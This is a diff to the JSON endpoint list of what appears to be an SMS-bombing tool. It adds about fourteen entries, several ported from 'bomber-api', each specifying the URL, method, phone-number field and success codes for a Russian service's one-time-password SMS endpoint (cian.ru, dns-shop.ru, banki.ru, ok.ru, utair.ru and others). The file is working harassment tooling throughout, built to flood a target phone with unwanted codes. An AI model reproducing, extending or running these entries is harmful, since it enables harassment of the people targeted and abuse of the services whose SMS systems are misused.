@@ -2518,7 +2518,9 @@
         "number": "{target}",
         "cc": "{cc}",
         "whatsAppOpted": false
-      }
+      },
+      "enabled": false,
+      "note": "disabled: API success without confirmed SMS delivery on RU"
     },
     {
       "name": "tbomb-newtonschools-11",
@@ -2756,6 +2758,316 @@
         "host": "meehelp.co.in"
       },
       "enabled": false
+    },
+    {
+      "name": "bomberapi-24tv",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://24htv.platform24.tv/v2/otps",
+      "countries": [
+        "RU"
+      ],
+      "body_type": "json",
+      "body": {
+        "phone": "{digits}"
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "ported from bomber-api 2.0.1"
+    },
+    {
+      "name": "bomberapi-almazholding",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://almazholding.ru/local/user1/sendcode.php",
+      "countries": [
+        "RU"
+      ],
+      "body_type": "form",
+      "body": {
+        "PHONE": "{digits}"
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      }
+    },
+    {
+      "name": "bomberapi-cian",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://ud-api.cian.ru/sms/v1/send-code/",
+      "countries": [
+        "RU"
+      ],
+      "body_type": "form",
+      "body": {
+        "phone": "{e164}",
+        "type": "authenticateCode"
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      }
+    },
+    {
+      "name": "bomberapi-citilink",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://www.citilink.ru/registration/confirm/phone/{e164}/",
+      "countries": [
+        "RU"
+      ],
+      "body_type": "form",
+      "body": {
+        "smsRequestToken": "",
+        "smsRepeatDelay": 60,
+        "smsRepeatsLimit": 3,
+        "phone": "{digits}",
+        "ret": 1,
+        "smsRepeatsDelay": 60
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      }
+    },
+    {
+      "name": "bomberapi-dns",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://www.dns-shop.ru/auth/auth/fast-authorization/",
+      "countries": [
+        "RU"
+      ],
+      "body_type": "form",
+      "body": {
+        "FastAuthorizationLoginLoadForm[login]": "{digits}",
+        "FastAuthorizationLoginLoadForm[token]": "",
+        "FastAuthorizationLoginLoadForm[isPhoneCall]:": 1
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      }
+    },
+    {
+      "name": "bomberapi-banki",
+      "kind": "otp",
+      "method": "GET",
+      "url": "https://www.banki.ru/ng/api/v1.0/public/auth/send-otp/",
+      "countries": [
+        "RU"
+      ],
+      "query": {
+        "phone": "{e164}",
+        "isRulesAccepted": "true",
+        "isAdAccepted": "true"
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      }
+    },
+    {
+      "name": "bomberapi-findclone",
+      "kind": "otp",
+      "method": "GET",
+      "url": "https://findclone.ru/register",
+      "countries": [
+        "RU"
+      ],
+      "query": {
+        "phone": "{digits}"
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      }
+    },
+    {
+      "name": "bomberapi-gettruck",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://gettruckapp.azurewebsites.net/api/User/RequestConfirmationCodePhone?phone={local}&isCustomer=true",
+      "countries": [
+        "RU"
+      ],
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      }
+    },
+    {
+      "name": "bomberapi-modulbank",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://my.modulbank.ru/api/v2/auth/phone",
+      "countries": [
+        "RU"
+      ],
+      "body_type": "json",
+      "body": {
+        "CellPhone": "{local}"
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      }
+    },
+    {
+      "name": "bomberapi-ok",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
+      "countries": [
+        "RU"
+      ],
+      "body_type": "form",
+      "body": {
+        "st.r.phone": "{digits}"
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      }
+    },
+    {
+      "name": "bomberapi-utair",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://b.utair.ru/api/v1/login/",
+      "countries": [
+        "RU"
+      ],
+      "body_type": "form",
+      "body": {
+        "confirmationGDPRDate": "{ts}",
+        "phone": "{digits}"
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      }
+    },
+    {
+      "name": "bomberapi-zdravcity",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://zdravcity.ru/bff/query",
+      "countries": [
+        "RU"
+      ],
+      "body_type": "json",
+      "body": {
+        "operationName": "isRegistered",
+        "variables": {
+          "phone": "{local}"
+        },
+        "query": "query isRegistered($phone: String!) {\n  isRegistered(phone: $phone)\n}\n"
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      }
+    },
+    {
+      "name": "bomberapi-rolf",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://lk.rolf.ru/api/register-sms-code",
+      "countries": [
+        "RU"
+      ],
+      "body_type": "json",
+      "body": {
+        "phone": "{e164}",
+        "reToken": ""
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      }
+    },
+    {
+      "name": "bomberapi-oyorooms",
+      "kind": "otp",
+      "method": "GET",
+      "url": "https://www.oyorooms.com/api/pwa/generateotp?locale=en",
+      "countries": [
+        "RU"
+      ],
+      "body_type": "json",
+      "body": {
+        "phone": "{local}",
+        "country_code": "+7",
+        "nod": 4
+      },
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      }
     }
   ]
 }
